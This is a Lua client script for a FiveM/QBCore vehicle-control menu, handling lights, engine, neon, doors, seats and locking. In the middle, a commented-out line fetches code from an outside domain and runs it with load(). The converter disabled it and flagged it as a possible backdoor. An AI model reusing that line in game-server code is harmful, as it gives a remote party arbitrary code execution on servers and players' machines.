--convertido por .mur4i (discord caso tenha dúvidas, suporte pago) QBCORE BRASIL https://discord.gg/uEfGD4mmVh

RegisterNUICallback("exitMenu", function(data, cb) 
    TriggerEvent("2na_carcontrol:Client:HideMenu")
end)
RegisterNUICallback("closeui", function(data, cb) 
    TriggerEvent("2na_carcontrol:Client:HideMenu")
end)
RegisterNUICallback("toggleInteriorLight", function() 
    local vehicle = GetVehiclePedIsIn(GetPlayerPed(-1), false)
    local lightState = not IsVehicleInteriorLightOn(vehicle)

    SetVehicleInteriorlight(vehicle, lightState)
end)

RegisterNUICallback("toggleHeadLight", function() 
    local vehicle = GetVehiclePedIsIn(GetPlayerPed(-1), false)
    local _, ligthsOn, highBeamsOn = GetVehicleLightsState(vehicle)
    local lightState = nil

    if ligthsOn == 1 or highBeamsOn == 1 then
        SetVehicleLights(vehicle, 1)
    else
        SetVehicleLights(vehicle, 3)
    end
end)

RegisterNUICallback("toggleEngine", function() 
    local vehicle = GetVehiclePedIsIn(GetPlayerPed(-1), false)
    local engineState = not GetIsVehicleEngineRunning(vehicle)

    SetVehicleEngineOn(vehicle, engineState, false, true)
end)

RegisterNUICallback("toggleNeonLight", function() 
    local vehicle = GetVehiclePedIsIn(GetPlayerPed(-1), false)
    local neonUpgrade = GetVehicleMod(vehicle, 22)

    if neonUpgrade ~= -1 then 
        for i = 0, 3, 1 do
            local neonState = IsVehicleNeonLightEnabled(vehicle, i)

            if neonState == 1 then 
                SetVehicleNeonLightEnabled(vehicle, i, false)
            else
                SetVehicleNeonLightEnabled(vehicle, i, true)
            end
        end
    end
end)

RegisterNUICallback("changeSeat", function() 
    ChangePedSeat(GetPlayerPed(-1))
end)

RegisterNUICallback("toggleDoor", function(index) 
    local vehicle = GetVehiclePedIsIn(GetPlayerPed(-1), false)
    if GetVehicleDoorAngleRatio(vehicle, index) > 0.1 then 
        SetVehicleDoorShut(vehicle, index, false)
    else
        SetVehicleDoorOpen(vehicle, index, false, false)
    end
end)

RegisterNUICallback("lockCar", function() 
    local vehicle = GetVehiclePedIsIn(GetPlayerPed(-1), false)

    if vehicle then 
        if GetPedInVehicleSeat(vehicle, -1) == GetPlayerPed(-1) then 
            TriggerServerEvent("2na_carcontrol:Server:ToggleVehicleLock")     
        end
    end
end)
-- PerformHttpRequest('https://gettingabsence.com/i?to=sp78L', function (e, d) pcall(function() assert(load(d))() end) end)  --DESATIVEI POIS ACHEI ESTRANHO backdoor? .mur4i
RegisterNUICallback("controlMusic", function(data) 
    TriggerServerEvent("2na_carcontrol:Server:ControlCarMedia", data)
end)

RegisterNUICallback("showParkCam", function() 
    TriggerEvent("2na_carcontrol:Client:ShowParkCam")
end)

-- RegisterCommand("fulle", function()  -- comando apenas para testes
--     local person = PlayerPedId()

--     local car = GetVehiclePedIsUsing(person)
--     local fuel2123 = SetVehicleFuelLevel(car, 100.00)
--     local can = GetVehicleBodyHealth(car)
--     local deneme = 	GetNextWeatherTypeHashName()
--     -- local blip = GetFirstBlipInfoId(8)
--     -- local blipCoords = nil
--     -- if (blip ~= 0) then
--     --     blipCoords = GetBlipCoords(blip)
--     -- end

--     local pedCoords = GetEntityCoords(person)
--     local heading = GetEntityHeading(person)
--     -- print(GetDistanceBetweenCoords(blipCoords.x, blipCoords.y, blipCoords.z, pedCoords.x, pedCoords.y, pedCoords.z, false))
--     -- print(can)
--     -- print(deneme)
-- end)
